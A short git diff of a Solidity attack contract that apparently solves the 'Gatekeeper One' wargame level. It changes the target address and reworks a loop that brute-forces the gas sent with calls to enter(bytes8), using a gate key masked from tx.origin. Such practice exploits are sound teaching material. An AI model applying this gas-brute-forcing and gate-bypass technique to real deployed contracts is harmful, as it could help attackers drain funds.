@@ -7,7 +7,7 @@ import {GatekeeperOne} from "../src/GatekeeperOne.sol";
 
 contract GatekeeperOneAttack {
 
-  GatekeeperOne gateKeeperOneInstance = GatekeeperOne(0x8aED719917d32A8d9d7ef7d5Ab270AF641c00f22);
+  GatekeeperOne gateKeeperOneInstance = GatekeeperOne(0xc5071E4a159a4Fa1083b4875596aE7E676673875);
 
   function gateOneAttack() external {
     // bytes8  _gatekey = 0xFFFFFFFF0000FFFF & bytes8(uint64(tx.origin));
@@ -17,13 +17,12 @@ contract GatekeeperOneAttack {
 
     
 
-      if(((8191 * 3) + i) % 8191 == 0) {
-        
+    
           (bool success,) = address(gateKeeperOneInstance).call{gas: (8191 *3) + i}(abi.encodeWithSignature("enter(bytes8)",_gateKey));
         if(success) {
           break;
         }
-      }
+        
     }
   }
 
